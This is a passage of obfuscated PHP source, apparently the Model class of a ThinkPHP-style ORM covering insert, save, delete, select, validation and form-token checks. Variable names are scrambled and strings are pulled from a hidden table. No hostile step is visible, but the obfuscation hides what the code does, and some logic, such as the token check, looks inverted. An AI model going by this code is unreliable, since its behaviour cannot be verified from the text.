$ë–¤„‚ü[278])) { $Éà’–Ê« = $this->db->insertAll($ğÔ¸©˜Ø, $ÏÈ›äõ…, $³³û¨Õ); } else { $this->startTrans(); foreach ($ğÔ¸©˜Ø as $¡Àæ€À° => $òõÕÂ‰) { $Éà’–Ê« = $this->db->insert($òõÕÂ‰, $ÏÈ›äõ…, $³³û¨Õ); } $this->commit(); } if (!1 !== $Éà’–Ê«) { $£’«©ƒï = $this->getLastInsID(); if ($£’«©ƒï) { return $£’«©ƒï; } } return $Éà’–Ê«; } public function selectAdd($õÓ› = '', $™‚¨£İ¢ = '', $Ÿ‘Çè©„ = array()) { $›½ôÅîï =& $_SERVER[ë¦»ºéÌ]; $Ÿ‘Çè©„ = $this->_parseOptions($Ÿ‘Çè©„); if (!1 === ($€„óš¥¬ = $this->db->selectInsert($õÓ› ? $õÓ› : $Ÿ‘Çè©„[$›½ôÅîï[279]], $™‚¨£İ¢ ? $™‚¨£İ¢ : $this->getTableName(), $Ÿ‘Çè©„))) { $this->error = think_lang($›½ôÅîï[280]); return !1; } else { return $€„óš¥¬; } } public function save($Å¾¦†Ã = '', $‚òÜ‹Íœ = array()) { $»®Ã“ìë =& $_SERVER[ë¦»ºéÌ]; if (empty($Å¾¦†Ã)) { if (!empty($this->data)) { $Å¾¦†Ã = $this->data; $this->data = array(); } else { $this->error = think_lang($»®Ã“ìë[277]); return !1; } } $Å¾¦†Ã = $this->_facade($Å¾¦†Ã); $‚òÜ‹Íœ = $this->_parseOptions($‚òÜ‹Íœ); $ª¸€šèú = $this->getPk(); if (!isset($‚òÜ‹Íœ[$»®Ã“ìë[281]])) { if (isset($Å¾¦†Ã[$ª¸€šèú])) { $Ğ…¼Ò–ã[$ª¸€šèú] = $Å¾¦†Ã[$ª¸€šèú]; $‚òÜ‹Íœ[$»®Ã“ìë[281]] = $Ğ…¼Ò–ã; unset($Å¾¦†Ã[$ª¸€šèú]); } else { $this->error = think_lang($»®Ã“ìë[280]); return !1; } } if (is_array($‚òÜ‹Íœ[$»®Ã“ìë[281]]) && isset($‚òÜ‹Íœ[$»®Ã“ìë[281]][$ª¸€šèú])) { $íôªï = $‚òÜ‹Íœ[$»®Ã“ìë[281]][$ª¸€šèú]; } if (!1 === $this->_beforeUpdate($Å¾¦†Ã, $‚òÜ‹Íœ)) { return !1; } $¦¢¢Á¯€ = $this->db->update($Å¾¦†Ã, $‚òÜ‹Íœ); if (!1 !== $¦¢¢Á¯€) { if (isset($íôªï)) { $Å¾¦†Ã[$ª¸€šèú] = $íôªï; } $this->_afterUpdate($Å¾¦†Ã, $‚òÜ‹Íœ); } return $¦¢¢Á¯€; } protected function _beforeUpdate(&$õâ×¢Âª, $ÓÏÒÑ¨©) { } protected function _afterUpdate($ë¤Ñ­Š³, $‰ç£ò÷) { } public function delete($úÅ¢˜°È = array()) { $Š“ ²¾£ =& $_SERVER[ë¦»ºéÌ]; if (empty($úÅ¢˜°È) && empty($this->options[$Š“ ²¾£[281]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ÂËÀó‘‹ = $this->getPk(); if (is_numeric($úÅ¢˜°È) || is_string($úÅ¢˜°È)) { if (strpos($úÅ¢˜°È, $Š“ ²¾£[60])) { $şøñ¿´°[$ÂËÀó‘‹] = array($Š“ ²¾£[282], $úÅ¢˜°È); } else { $şøñ¿´°[$ÂËÀó‘‹] = $úÅ¢˜°È; } $this->options[$Š“ ²¾£[281]] = $şøñ¿´°; } $úÅ¢˜°È = $this->_parseOptions(); if (is_array($úÅ¢˜°È[$Š“ ²¾£[281]]) && isset($úÅ¢˜°È[$Š“ ²¾£[281]][$ÂËÀó‘‹])) { $îæÌàÆµ = $úÅ¢˜°È[$Š“ ²¾£[281]][$ÂËÀó‘‹]; } $¶¨ûİ· = $this->db->delete($úÅ¢˜°È); if (!1 !== $¶¨ûİ·) { $û²´¯ = array(); if (isset($îæÌàÆµ)) { $û²´¯[$ÂËÀó‘‹] = $îæÌàÆµ; } $this->_after_delete($û²´¯, $úÅ¢˜°È); } return $¶¨ûİ·; } protected function _after_delete($ÈÊ€ğ¡œ, $ºÙà£±à) { } public function select($ñáÄÂ¯Ù = array()) { $èÅÆ´Ş– =& $_SERVER[ë¦»ºéÌ]; if (is_string($ñáÄÂ¯Ù) || is_numeric($ñáÄÂ¯Ù)) { $Íìºî…ı = $this->getPk(); if (strpos($ñáÄÂ¯Ù, $èÅÆ´Ş–[60])) { $¹¡®Ìéé[$Íìºî…ı] = array($èÅÆ´Ş–[282], $ñáÄÂ¯Ù); } else { $¹¡®Ìéé[$Íìºî…ı] = $ñáÄÂ¯Ù; } $this->options[$èÅÆ´Ş–[281]] = $¹¡®Ìéé; } elseif (!1 === $ñáÄÂ¯Ù) { $ñáÄÂ¯Ù = $this->_parseOptions(); return $èÅÆ´Ş–[283] . $this->db->buildSelectSql($ñáÄÂ¯Ù) . $èÅÆ´Ş–[284]; } $ñáÄÂ¯Ù = $this->_parseOptions(); $ŸÅÚĞËŒ = $this->db->select($ñáÄÂ¯Ù); if (!1 === $ŸÅÚĞËŒ) { return !1; } if (empty($ŸÅÚĞËŒ)) { return null; } $this->_afterSelect($ŸÅÚĞËŒ, $ñáÄÂ¯Ù); return $ŸÅÚĞËŒ; } protected function _afterSelect(&$óËãÒè¤, $ê³ç‡) { } public function buildSql($ŞëÜÃÒä = array()) { $Šıà¶è =& $_SERVER[ë¦»ºéÌ]; $ŞëÜÃÒä = $this->_parseOptions($ŞëÜÃÒä); return $Šıà¶è[283] . $this->db->buildSelectSql($ŞëÜÃÒä) . $Šıà¶è[284]; } public function optionsValue($…õôïË³ = null) { if (is_null($…õôïË³)) { return $this->options; } elseif (is_array($…õôïË³)) { $this->options = array_merge($this->options, $…õôïË³); } } protected function _parseOptions($„û³ÔÛ– = array()) { $†‘ç˜ÍÕ =& $_SERVER[ë¦»ºéÌ]; if (is_array($„û³ÔÛ–)) { $„û³ÔÛ– = array_merge($this->options, $„û³ÔÛ–); } $this->options = array(); if (!isset($„û³ÔÛ–[$†‘ç˜ÍÕ[285]])) { $„û³ÔÛ–[$†‘ç˜ÍÕ[285]] = $this->getTableName(); $´Ğğ²Â = $this->fields; } else { $´Ğğ²Â = $this->getDbFields(); } if (!empty($„û³ÔÛ–[$†‘ç˜ÍÕ[286]])) { $„û³ÔÛ–[$†‘ç˜ÍÕ[285]] .= $†‘ç˜ÍÕ[63] . $„û³ÔÛ–[$†‘ç˜ÍÕ[286]]; } $„û³ÔÛ–[$†‘ç˜ÍÕ[287]] = $this->name; if (isset($„û³ÔÛ–[$†‘ç˜ÍÕ[281]]) && is_array($„û³ÔÛ–[$†‘ç˜ÍÕ[281]]) && !empty($´Ğğ²Â) && !isset($„û³ÔÛ–[$†‘ç˜ÍÕ[288]]) && !isset($„û³ÔÛ–[$†‘ç˜ÍÕ[285]])) { foreach ($„û³ÔÛ–[$†‘ç˜ÍÕ[281]] as $Ø¶½çÍ• => $ë¢ï´ö¦) { $Ø¶½çÍ• = trim($Ø¶½çÍ•); if (in_array($Ø¶½çÍ•, $´Ğğ²Â, !0)) { if (is_scalar($ë¢ï´ö¦)) { $this->_parseType($„û³ÔÛ–[$†‘ç˜ÍÕ[281]], $Ø¶½çÍ•); } } elseif (!is_numeric($Ø¶½çÍ•) && $†‘ç˜ÍÕ[11] != substr($Ø¶½çÍ•, 0, 1) && !1 === strpos($Ø¶½çÍ•, $†‘ç˜ÍÕ[10]) && !1 === strpos($Ø¶½çÍ•, $†‘ç˜ÍÕ[266]) && !1 === strpos($Ø¶½çÍ•, $†‘ç˜ÍÕ[289]) && !1 === strpos($Ø¶½çÍ•, $†‘ç˜ÍÕ[290])) { unset($„û³ÔÛ–[$†‘ç˜ÍÕ[281]][$Ø¶½çÍ•]); } } } $this->_options_filter($„û³ÔÛ–); return $„û³ÔÛ–; } protected function _options_filter(&$÷ŞÃê·Ø) { } protected function _parseType(&$¥…‹†«, $ì¨½›–Æ) { $°ûüÇ€ =& $_SERVER[ë¦»ºéÌ]; if (empty($this->options[$°ûüÇ€[291]][$°ûüÇ€[4] . $ì¨½›–Æ])) { $Ò¿”Öß = strtolower($this->fields[$°ûüÇ€[258]][$ì¨½›–Æ]); if (!1 !== strpos($Ò¿”Öß, $°ûüÇ€[292])) { } elseif (!1 === strpos($Ò¿”Öß, $°ûüÇ€[293]) && !1 !== strpos($Ò¿”Öß, $°ûüÇ€[294])) { $¥…‹†«[$ì¨½›–Æ] = intval($¥…‹†«[$ì¨½›–Æ]); } elseif (!1 !== strpos($Ò¿”Öß, $°ûüÇ€[295]) || !1 !== strpos($Ò¿”Öß, $°ûüÇ€[296])) { $¥…‹†«[$ì¨½›–Æ] = floatval($¥…‹†«[$ì¨½›–Æ]); } elseif (!1 !== strpos($Ò¿”Öß, $°ûüÇ€[297])) { $¥…‹†«[$ì¨½›–Æ] = (bool) $¥…‹†«[$ì¨½›–Æ]; } } } public function find($İÕ°±™• = array()) { $„Á•é¨— =& $_SERVER[ë¦»ºéÌ]; if (is_numeric($İÕ°±™•) || is_string($İÕ°±™•)) { $Á§¥ Şµ[$this->getPk()] = intval($İÕ°±™•); $this->options[$„Á•é¨—[281]] = $Á§¥ Şµ; } $this->options[$„Á•é¨—[298]] = 1; $İÕ°±™• = $this->_parseOptions(); $²ÖŠøş¥ = $this->db->select($İÕ°±™•); if (!1 === $²ÖŠøş¥) { return !1; } if (empty($²ÖŠøş¥)) { return null; } $this->data = $²ÖŠøş¥[0]; $this->_afterFind($this->data, $İÕ°±™•); if (!empty($this->options[$„Á•é¨—[299]])) { return $this->returnResult($this->data, $this->options[$„Á•é¨—[299]]); } return $this->data; } protected function _afterFind(&$äÌåÄ‘ò, $İï®Æ™Ö) { } protected function returnResult($÷ ¢àòº, $œˆ±Æ—© = '') { $è¦²ôø =& $_SERVER[ë¦»ºéÌ]; if ($œˆ±Æ—©) { if (is_callable($œˆ±Æ—©)) { return call_user_func($œˆ±Æ—©, $÷ ¢àòº); } switch (strtolower($œˆ±Æ—©)) { case $è¦²ôø[300]: return json_encode($÷ ¢àòº); case $è¦²ôø[301]: return xml_encode($÷ ¢àòº); } } return $÷ ¢àòº; } public function parseFieldsMap($îé§íä¶, $ÙşÔã‡ß = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Óàë«–Ê => $¥ÛÅ­Ëï) { if ($ÙşÔã‡ß == 1) { if (isset($îé§íä¶[$¥ÛÅ­Ëï])) { $îé§íä¶[$Óàë«–Ê] = $îé§íä¶[$¥ÛÅ­Ëï]; unset($îé§íä¶[$¥ÛÅ­Ëï]); } } else { if (isset($îé§íä¶[$Óàë«–Ê])) { $îé§íä¶[$¥ÛÅ­Ëï] = $îé§íä¶[$Óàë«–Ê]; unset($îé§íä¶[$Óàë«–Ê]); } } } } return $îé§íä¶; } public function setField($Šä€Ï¨ë, $ÁËèÌ¿£ = '') { if (is_array($Šä€Ï¨ë)) { $§êŞ•”Ÿ = $Šä€Ï¨ë; } else { $§êŞ•”Ÿ[$Šä€Ï¨ë] = $ÁËèÌ¿£; } return $this->save($§êŞ•”Ÿ); } public function setAdd($Ïş¤õã‹, $…íÚÉ = 1) { $Ú„¨¼ĞÀ =& $_SERVER[ë¦»ºéÌ]; $‰áªİ‚é = $Ïş¤õã‹ . $Ú„¨¼ĞÀ[302] . $…íÚÉ; if ($…íÚÉ < 0) { $‰áªİ‚é = $Ïş¤õã‹ . $…íÚÉ; } return $this->setField($Ïş¤õã‹, array($Ú„¨¼ĞÀ[303], $‰áªİ‚é)); } public function getField($Ëæèì», $Ô¤œĞÍø = null) { $àç€Ä«¡ =& $_SERVER[ë¦»ºéÌ]; $„°¿öá[$àç€Ä«¡[279]] = $Ëæèì»; $„°¿öá = $this->_parseOptions($„°¿öá); $Ëæèì» = trim($Ëæèì»); if (strpos($Ëæèì», $àç€Ä«¡[60])) { if (!isset($„°¿öá[$àç€Ä«¡[298]])) { $„°¿öá[$àç€Ä«¡[298]] = is_numeric($Ô¤œĞÍø) ? $Ô¤œĞÍø : $àç€Ä«¡[12]; } $ÁúîæÌ© = $this->db->select($„°¿öá); if (!empty($ÁúîæÌ©)) { $Ğµê¿» = explode($àç€Ä«¡[60], $Ëæèì»); $Ëæèì» = array_keys($ÁúîæÌ©[0]); $ÑÕ•ÙÏ = array_shift($Ëæèì»); $öĞ¾« = array_shift($Ëæèì»); $š“áÆÜ“ = array(); $¸¬öõ’‚ = count($Ğµê¿»); foreach ($ÁúîæÌ© as $Úòó¯ü) { $Óë¥çÏ€ = $Úòó¯ü[$ÑÕ•ÙÏ]; if (2 == $¸¬öõ’‚) { $š“áÆÜ“[$Óë¥çÏ€] = $Úòó¯ü[$öĞ¾«]; } else { $š“áÆÜ“[$Óë¥çÏ€] = is_string($Ô¤œĞÍø) ? implode($Ô¤œĞÍø, $Úòó¯ü) : $Úòó¯ü; } } return $š“áÆÜ“; } } else { if (!0 !== $Ô¤œĞÍø) { $„°¿öá[$àç€Ä«¡[298]] = is_numeric($Ô¤œĞÍø) ? $Ô¤œĞÍø : 1; } if ($Ô¤œĞÍø === $àç€Ä«¡[261]) { unset($„°¿öá[$àç€Ä«¡[298]]); } $Úòó¯ü = $this->db->select($„°¿öá); if (!empty($Úòó¯ü)) { if ($Ô¤œĞÍø === $àç€Ä«¡[261]) { return reset($Úòó¯ü[0]); } if (!0 !== $Ô¤œĞÍø && 1 == $„°¿öá[$àç€Ä«¡[298]]) { return reset($Úòó¯ü[0]); } foreach ($Úòó¯ü as $¶˜ğ˜Áş) { $ãÁëÅŒ[] = $¶˜ğ˜Áş[$Ëæèì»]; } return $ãÁëÅŒ; } } return null; } public function create($’†óîáÄ = '', $œÌ’£ä = '') { $ÄØğè·û =& $_SERVER[ë¦»ºéÌ]; if (empty($’†óîáÄ)) { $’†óîáÄ = $_POST; } elseif (is_object($’†óîáÄ)) { $’†óîáÄ = get_object_vars($’†óîáÄ); } if (empty($’†óîáÄ) || !is_array($’†óîáÄ)) { $this->error = think_lang($ÄØğè·û[277]); return !1; } $’†óîáÄ = $this->parseFieldsMap($’†óîáÄ, 0); $œÌ’£ä = $œÌ’£ä ? $œÌ’£ä : (!empty($’†óîáÄ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ÄØğè·û[279]])) { $ÒÃ†õª‚ = $this->options[$ÄØğè·û[279]]; unset($this->options[$ÄØğè·û[279]]); } elseif ($œÌ’£ä == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÒÃ†õª‚ = $this->insertFields; } elseif ($œÌ’£ä == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ÒÃ†õª‚ = $this->updateFields; } if (isset($ÒÃ†õª‚)) { if (is_string($ÒÃ†õª‚)) { $ÒÃ†õª‚ = explode($ÄØğè·û[60], $ÒÃ†õª‚); } if (think_config($ÄØğè·û[304])) { $ÒÃ†õª‚[] = think_config($ÄØğè·û[305]); } foreach ($’†óîáÄ as $µÆ»ÂÂÆ => $ÑâÇóº©) { if (!in_array($µÆ»ÂÂÆ, $ÒÃ†õª‚)) { unset($’†óîáÄ[$µÆ»ÂÂÆ]); } } } if (!$this->autoValidation($’†óîáÄ, $œÌ’£ä)) { return !1; } if (!$this->autoCheckToken($’†óîáÄ)) { $this->error = think_lang($ÄØğè·û[306]); return !1; } if ($this->autoCheckFields) { $ÒÃ†õª‚ = $this->getDbFields(); foreach ($’†óîáÄ as $µÆ»ÂÂÆ => $ÑâÇóº©) { if (!in_array($µÆ»ÂÂÆ, $ÒÃ†õª‚)) { unset($’†óîáÄ[$µÆ»ÂÂÆ]); } elseif (MAGIC_QUOTES_GPC && is_string($ÑâÇóº©)) { $’†óîáÄ[$µÆ»ÂÂÆ] = stripslashes($ÑâÇóº©); } } } $this->autoOperation($’†óîáÄ, $œÌ’£ä); $this->data = $’†óîáÄ; return $’†óîáÄ; } public function autoCheckToken($Ü„ó€Á) { $ÆÇßŒ˜ =& $_SERVER[ë¦»ºéÌ]; if (isset($this->options[$ÆÇßŒ˜[307]]) && !$this->options[$ÆÇßŒ˜[307]]) { return !0; } if (think_config($ÆÇßŒ˜[304])) { $«ÔÃÖ¡ü = think_config($ÆÇßŒ˜[305]); if (!isset($Ü„ó€Á[$«ÔÃÖ¡ü]) || Session::get($«ÔÃÖ¡ü)) { return !1; } list($»ö˜¯åÃ, $üñšßÊ©) = explode($ÆÇßŒ˜[11], $Ü„ó€Á[$«ÔÃÖ¡ü]); if ($üñšßÊ© && Session::get($«ÔÃÖ¡ü . $ÆÇßŒ˜[10] . $»ö˜¯åÃ) === $üñšßÊ©) { Session::remove($«ÔÃÖ¡ü . $ÆÇßŒ˜[10] . $»ö˜¯åÃ); return !0; } if (think_config($ÆÇßŒ˜[308])) { Session::remove($«ÔÃÖ¡ü . $ÆÇßŒ˜[10] . $»ö˜¯åÃ); } return !1; } return !0; } public function regex($ÂŸ¼Åà, $“İ—¨«ş) { $ú“Ş‹ûã =& $_SERVER[ë¦»ºéÌ]; $äµ‘ÔÖ‰ = array($ú“Ş‹ûã[309] => $ú“Ş‹ûã[310], $ú“Ş‹ûã[311] => $ú“Ş‹ûã[312], $ú“Ş‹ûã[313] => $ú“Ş‹ûã[314], $ú“Ş‹ûã[315] => $ú“Ş‹ûã[316], $ú“Ş‹ûã[317] => $ú“Ş‹ûã[318], $ú“Ş‹ûã[319] => $ú“Ş‹ûã[320], $ú“Ş‹ûã[321] => $ú“Ş‹ûã[322], $ú“Ş‹ûã[296] => $ú“Ş‹ûã[323], $ú“Ş‹ûã[324] => $ú“Ş‹ûã[325]); if (isset($äµ‘ÔÖ‰[strtolower($“İ—¨«ş)])) { $“İ—¨«ş = $äµ‘ÔÖ‰[strtolower($“İ—¨«ş)]; } return preg_match($“İ—¨«ş, $ÂŸ¼Åà) === 1; } private function autoOperation(&$„®‹ÈÌÏ, $±©Á–¹£) { $ÏùÅ²şö =& $_SERVER[ë¦»ºéÌ]; if (!empty($this->options[$ÏùÅ²şö[326]])) { $—Ï™å§Ä = $this->options[$ÏùÅ²şö[326]]; unset($this->options[$ÏùÅ²şö[326]]); } elseif (!empty($this->_auto)) { $—Ï™å§Ä = $this->_auto; } if (isset($—Ï™å§Ä)) { foreach ($—Ï™å§Ä as $Ğ¢¶â€) { if (empty($Ğ¢¶â€[2])) { $Ğ¢¶â€[2] = THINK_MODEL_INSERT; } if ($±©Á–¹£ == $Ğ¢¶â€[2] || $Ğ¢¶â€[2] == THINK_MODEL_BOTH) { switch (trim($Ğ¢¶â€[3])) { case $ÏùÅ²şö[327]: case $ÏùÅ²şö[328]: $¥¶Ùµˆè = isset($Ğ¢¶â€[4]) ? (array) $Ğ¢¶â€[4] : array(); if (isset($„®‹ÈÌÏ[$Ğ¢¶â€[0]])) { array_unshift($¥¶Ùµˆè, $„®‹ÈÌÏ[$Ğ¢¶â€[0]]); } if ($ÏùÅ²şö[327] == $Ğ¢¶â€[3]) { $„®‹ÈÌÏ[$Ğ¢¶â€[0]] = call_user_func_array($Ğ¢¶â€[1], $¥¶Ùµˆè); } else { $„®‹ÈÌÏ[$Ğ¢¶â€[0]] = call_user_func_array(array(&$this, $Ğ¢¶â€[1]), $¥¶Ùµˆè); } break; case $ÏùÅ²şö[279]: $„®‹ÈÌÏ[$Ğ¢¶â€[0]] = $„®‹ÈÌÏ[$Ğ¢¶â€[1]]; break; case $ÏùÅ²şö[329]: if ($ÏùÅ²şö[12] === $„®‹ÈÌÏ[$Ğ¢¶â€[0]]) { unset($„®‹ÈÌÏ[$Ğ¢¶â€[0]]); } break; case $ÏùÅ²şö[330]: default: $„®‹ÈÌÏ[$Ğ¢¶â€[0]] = $Ğ¢¶â€[1]; } if (!1 === $„®‹ÈÌÏ[$Ğ¢¶â€[0]]) { unset($„®‹ÈÌÏ[$Ğ¢¶â€[0]]); } } } } return $„®‹ÈÌÏ; } protected function autoValidation($µıŠ, $Ã¿ÜÆ“õ) { $ö† ĞŞ¯ =& $_SERVER[ë¦»ºéÌ]; if (!empty($this->options[$ö† ĞŞ¯[331]])) { $·Øèºø¡ = $this->options[$ö† ĞŞ¯[331]]; unset($this->options[$ö† ĞŞ¯[331]]); } elseif (!empty($this->_validate)) { $·Øèºø¡ = $this->_validate; } if (isset($·Øèºø¡)) { if ($this->patchValidate) { $this->error = array(); } foreach ($·Øèºø¡ as $ô¦€û³ë => $ŸÓ˜‡Œ¢) { if (empty($ŸÓ˜‡Œ¢[5]) || $ŸÓ˜‡Œ¢[5] == THINK_MODEL_BOTH || $ŸÓ˜‡Œ¢[5] == $Ã¿ÜÆ“õ) { if (0 == strpos($ŸÓ˜‡Œ¢[2], $ö† ĞŞ¯[332]) && strpos($ŸÓ˜‡Œ¢[2], $ö† ĞŞ¯[333])) { $ŸÓ˜‡Œ¢[2] = think_lang(substr($ŸÓ˜‡Œ¢[2], 2, -1)); } $ŸÓ˜‡Œ¢[3] = isset($ŸÓ˜‡Œ¢[3]) ? $ŸÓ˜‡Œ¢[3] : THINK_EXISTS_VALIDATE; $ŸÓ˜‡Œ¢[4] = isset($ŸÓ˜‡Œ¢[4]) ? $ŸÓ˜‡Œ¢[4] : $ö† ĞŞ¯[334]; switch ($ŸÓ˜‡Œ¢[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($µıŠ, $ŸÓ˜‡Œ¢)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ö† ĞŞ¯[12] != trim($µıŠ[$ŸÓ˜‡Œ¢[0]])) { if (!1 === $this->_validationField($µıŠ, $ŸÓ˜‡Œ¢)) { return !1; } } break; default: if (isset($µıŠ[$ŸÓ˜‡Œ¢[0]])) { if (!1 === $this->_validationField($µıŠ, $ŸÓ˜‡Œ¢)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($‡·“È¥¢, $İ–Á¹£¬) { if (!1 === $this->_validationFieldItem($‡·“È¥¢, $İ–Á¹£¬)) { if ($this->patchValidate) { $this->error[$İ–Á¹£¬[0]] = $İ–Á¹£¬[2]; } else { $this->error = $İ–Á¹£¬[2]; return !1; } } return; } protected function _validationFieldItem($ü‡…¯Ô¡, $ô¼êú¡) { $‚œÏ®ú‘ =& $_SERVER[ë¦»ºéÌ]; switch (strtolower(trim($ô¼êú¡[4]))) { case $‚œÏ®ú‘[327]: case $‚œÏ®ú‘[328]: $Ê¼âæó = isset($ô¼êú¡[6]) ? (array) $ô¼êú¡[6] : array(); if (is_string($ô¼êú¡[0]) && strpos($ô¼êú¡[0], $‚œÏ®ú‘[60])) { $ô¼êú¡[0] = explode($‚œÏ®ú‘[60], $ô¼êú¡[0]); } if (is_array($ô¼êú¡[0])) { foreach ($ô¼êú¡[0] as $ßÚÆÄ«¼) { $¨ù‹ÙÒ°[$ßÚÆÄ«¼] = $ü‡…¯Ô¡[$ßÚÆÄ«¼]; } array_unshift($Ê¼âæó, $¨ù‹ÙÒ°); } else { array_unshift($Ê¼âæó, $ü‡…¯Ô¡[$ô¼êú¡[0]]); } if ($‚œÏ®ú‘[327] == $ô¼êú¡[4]) { return call_user_func_array($ô¼êú¡[1], $Ê¼âæó); } else { return call_user_func_array(array(&$this, $ô¼êú¡[1]), $Ê¼âæó); } case $‚œÏ®ú‘[335]: return $ü‡…¯Ô¡[$ô¼êú¡[0]] == $ü‡…¯Ô¡[$ô¼êú¡[1]]; case $‚œÏ®ú‘[336]: if (is_string($ô¼êú¡[0]) && strpos($ô¼êú¡[0], $‚œÏ®ú‘[60])) { $ô¼êú¡[0] = explode($‚œÏ®ú‘[60], $ô¼êú¡[0]); } $ÁŸß†Ê® = array(); if (is_array($ô¼êú¡[0])) { foreach ($ô¼êú¡[0] as $ßÚÆÄ«¼) { $ÁŸß†Ê®[$ßÚÆÄ«¼] = $ü‡…¯Ô¡[$ßÚÆÄ«¼]; } } else { $ÁŸß†Ê®[$ô¼êú¡[0]] = $ü‡…¯Ô¡[$ô¼êú¡[0]]; } if (!empty($ü‡…¯Ô¡[$this->getPk()])) { $ÁŸß†Ê®[$this->getPk()] = array($‚œÏ®ú‘[337], $ü‡…¯Ô¡[$this->getPk()]); } if ($this->where($ÁŸß†Ê®)->find()) { return !1; } return !0; default: return $this->check($ü‡…¯Ô¡[$ô¼êú¡[0]], $ô¼êú¡[1], $ô¼êú¡[4]); } } public function check($Ë™–¸û‹, $Å ¯™ÑÍ, $ÄÇÔµÈŞ = "\162\x65\x67\x65\170") { $À’İÏâ— =& $_SERVER[ë¦»ºéÌ]; $ÄÇÔµÈŞ = strtolower(trim($ÄÇÔµÈŞ)); switch ($ÄÇÔµÈŞ) { case $À’İÏâ—[7]: case $À’İÏâ—[338]: $ë«³Âù = is_array($Å ¯™ÑÍ) ? $Å ¯™ÑÍ : explode($À’İÏâ—[60], $Å ¯™ÑÍ); return $ÄÇÔµÈŞ == $À’İÏâ—[7] ? in_array($Ë™–¸û‹, $ë«³Âù) : !in_array($Ë™–¸û‹, $ë«³Âù); case $À’İÏâ—[339]: case $À’İÏâ—[340]: if (is_array($Å ¯™ÑÍ)) { $‚ƒ»ú­‡ = $Å ¯™ÑÍ[0]; $«áñå¹© = $Å ¯™ÑÍ[1]; } else { list($‚ƒ»ú­‡, $«áñå¹©) = explode($À’İÏâ—[60], $Å ¯™ÑÍ); } return $ÄÇÔµÈŞ == $À’İÏâ—[339] ? $Ë™–¸û‹ >= $‚ƒ»ú­‡ && $Ë™–¸û‹ <= $«áñå¹© : $Ë™–¸û‹ < $‚ƒ»ú­‡ || $Ë™–¸û‹ > $«áñå¹©; case $À’İÏâ—[341]: case $À’İÏâ—[342]: return $ÄÇÔµÈŞ == $À’İÏâ—[341] ? $Ë™–¸û‹ == $Å ¯™ÑÍ : $Ë™–¸û‹ != $Å ¯™ÑÍ; case $À’İÏâ—[343]: $Ş’Ä²Ú” = mb_strlen($Ë™–¸û‹, $À’İÏâ—[344]); if (strpos($Å ¯™ÑÍ, $À’İÏâ—[60])) { list($‚ƒ»ú­‡, $«áñå¹©) = explode($À’İÏâ—[60], $Å ¯™ÑÍ); return $Ş’Ä²Ú” >= $‚ƒ»ú­‡ && $Ş’Ä²Ú” <= $«áñå¹©; } else { return $Ş’Ä²Ú” == $Å ¯™ÑÍ; } case $À’İÏâ—[345]: list($ù©¾´¯, $ÅÒİ†ŒÑ) = explode($À’İÏâ—[60], $Å ¯™ÑÍ); if (!is_numeric($ù©¾´¯)) { $ù©¾´¯ = strtotime($ù©¾´¯); } if (!is_numeric($ÅÒİ†ŒÑ)) { $ÅÒİ†ŒÑ = strtotime($ÅÒİ†ŒÑ); } return NOW_TIME >= $ù©¾´¯ && NOW_TIME <= $ÅÒİ†ŒÑ; case $À’İÏâ—[346]: return in_array(get_client_ip(), explode($À’İÏâ—[60], $Å ¯™ÑÍ)); case $À’İÏâ—[347]: return !in_array(get_client_ip(), explode($À’İÏâ—[60], $Å ¯™ÑÍ)); case $À’İÏâ—[334]: default: return $this->regex($Ë™–¸û‹, $Å ¯™ÑÍ); } } public function query($Ì…ˆÄ’, $¾›‚²ºÀ = false) { $¾æ·äîÀ =& $_SERVER[ë¦»ºéÌ]; if (!is_bool($¾›‚²ºÀ) && !is_array($¾›‚²ºÀ)) { $¾›‚²ºÀ = func_get_args(); array_shift($¾›‚²ºÀ); } $Ì…ˆÄ’ = str_replace(array($¾æ·äîÀ[18], $¾æ·äîÀ[348]), $¾æ·äîÀ[63], $Ì…ˆÄ’); $Ì…ˆÄ’ = $this->parseSql($Ì…ˆÄ’, $¾›‚²ºÀ); return $this->db->query($Ì…ˆÄ’); } public function execute($ ÁçÓ«, $¿¯¡ùÙË = false) { if (!is_bool($¿¯¡ùÙË) && !is_array($¿¯¡ùÙË)) { $¿¯¡ùÙË = func_get_args(); array_shift($¿¯¡ùÙË); } $ ÁçÓ« = $this->parseSql($ ÁçÓ«, $¿¯¡ùÙË); return $this->db->execute($ ÁçÓ«); } protected function parseSql($ä™ôæÕÅ, $Şß Ï·Ë) { $¼áŠÉ‘¾ =& $_SERVER[ë¦»ºéÌ]; if (!0 === $Şß Ï·Ë) { $©ª¡Š•Ë = $this->_parseOptions(); $ä™ôæÕÅ = $this->db->parseSql($ä™ôæÕÅ, $©ª¡Š•Ë); } elseif (is_array($Şß Ï·Ë)) { $Şß Ï·Ë = array_map(array($this->db, $¼áŠÉ‘¾[349]), $Şß Ï·Ë); $ä™ôæÕÅ = vsprintf($ä™ôæÕÅ, $Şß Ï·Ë); } else { $ä™ôæÕÅ = strtr($ä™ôæÕÅ, array($¼áŠÉ‘¾[350] => $this->getTableName(), $¼áŠÉ‘¾[351] => think_config($¼áŠÉ‘¾[250]))); } $this->db->setModel($this->name); return $ä™ôæÕÅ; } public function db($ßûïÚ = '', $¾½°í¿á = '', $†é€¸¥ô = array()) { $¢éƒœ¸ü =& $_SERVER[ë¦»ºéÌ]; if ($¢éƒœ¸ü[12] === $ßûïÚ && $this->db) { return $this->db; } static $±çà¹±ã = array(); static $êìòÅ™İ = array(); if (!isset($êìòÅ™İ[$ßûïÚ]) || isset($êìòÅ™İ[$ßûïÚ]) && $¾½°í¿á && $±çà¹±ã[$ßûïÚ] != $¾½°í¿á) { if (!empty($¾½°í¿á) && is_string($¾½°í¿á) && !1 === strpos($¾½°í¿á, $¢éƒœ¸ü[8])) { $¾½°í¿á = think_config($¾½°í¿á); } $ßûïÚ = think_guid($¾½°í¿á); $êìòÅ™İ[$ßûïÚ] = Db::getInstance($¾½°í¿á); } elseif (NULL === $¾½°í¿á) { $êìòÅ™İ[$ßûïÚ]->close(); unset($êìòÅ™İ[$ßûïÚ]); return; } if (!empty($†é€¸¥ô)) { if 